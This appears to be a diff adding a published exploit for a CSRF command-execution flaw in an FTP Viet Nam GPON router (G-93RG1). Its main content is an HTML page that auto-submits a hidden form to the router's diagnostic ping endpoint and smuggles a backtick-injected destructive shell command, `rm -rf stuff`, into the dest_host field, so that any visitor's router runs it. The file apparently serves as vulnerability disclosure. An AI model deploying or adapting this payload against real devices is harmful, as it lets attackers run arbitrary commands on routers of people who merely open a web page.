@@ -1,0 +1,48 @@
+<!--
+######################################################################
+# Exploit Title: GPON Home CSRF With Command ExecuteVulnerability
+# Author: Phan Thanh Duy (logicaway) - KAISAI12 (ceh.vn)
+# E-mail:(facebook https://www.facebook.com/duy.phanthanh.75),(
+https://www.facebook.com/kai.sai.35)
+# Category: Hardware
+# Google Dork: N/A
+# Vendor: FTP Viet Nam
+# Firmware Version: 3.0.0 Build 120531
+# Product: FTP G-93RG1
+#
+#
+# Tested on: Windows 8 64-bit
+######################################################################
+
+#Introduction
+==============
+
+#Description of Vulnerability
+=============================
+Execute command with CSRF
+
+#Exploit
+========
+-->
+
+<html>
+<head>
+<title>CSRF Demo Exploit</title>
+</head>
+<body>
+
+<form name="auto" method="POST"
+action="http://192.168.1.1/GponForm/diag_XForm"
+enctype="multipart/form-data">
+<input type="hidden" name="XWebPageName" value="diag"/>
+<input type="hidden" name="diag_action" value="ping"/>
+<input type="hidden" name="wan_conlist" value="0"/>
+<input type="hidden" name="dest_host" value="`rm -rf stuff`"/>
+<input type="hidden" name="ipver" value="0"/>
+<!-- input type="submit" name="submit"/> -->
+</form>
+<script type="text/javascript">
+      document.auto.submit();
+</script>
+</body>
+</html>
